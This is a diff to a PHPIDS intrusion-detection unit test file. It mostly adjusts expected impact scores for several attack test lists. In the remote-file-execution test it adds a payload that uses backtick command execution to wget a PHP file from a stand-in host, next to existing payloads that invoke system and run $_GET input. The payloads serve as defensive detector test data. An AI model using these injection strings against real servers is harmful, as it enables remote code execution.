@@ -556,7 +556,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(477, $result->getImpact());
+        $this->assertEquals(491, $result->getImpact());
     }
 
     public function testSQLIList2() {
@@ -615,7 +615,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(582, $result->getImpact());
+        $this->assertEquals(596, $result->getImpact());
     }
 
     public function testSQLIList3() {
@@ -719,7 +719,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(788, $result->getImpact());
+        $this->assertEquals(781, $result->getImpact());
     }
 
     public function testSQLIList5() {
@@ -797,7 +797,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(819, $result->getImpact());
+        $this->assertEquals(821, $result->getImpact());
     }    
     
     public function testDTList(){
@@ -868,7 +868,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(132, $result->getImpact());
+        $this->assertEquals(127, $result->getImpact());
     }
 
     public function testRFEList() {
@@ -921,6 +921,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
                         if (!($_b[]  %1)) $_a[0]  = system;
                         $_a[0](!a. "ls");  //';
         $exploits[] = '; e|$a=&$_GET; 0|$b=!a .$a[b];$a[a](`$b`);//';
+        $exploits[] = 'aaaa { $ {`wget hxxp://example.com/x.php`}}';
         
         $this->_testForPlainEvent($exploits);
         
@@ -929,7 +930,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(490, $result->getImpact());
+        $this->assertEquals(495, $result->getImpact());
     }
 
     public function testUTF7List() {
@@ -981,7 +982,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(75, $result->getImpact());
+        $this->assertEquals(70, $result->getImpact());
     }
 
     public function testOctalCCConverter() {
@@ -1038,7 +1039,7 @@ class IDS_MonitorTest extends PHPUnit_Framework_TestCase {
             $this->init
         );
         $result = $test->run();
-        $this->assertEquals(131, $result->getImpact());
+        $this->assertEquals(126, $result->getImpact());
     }
 
     public function testLDAPInjectionList() {
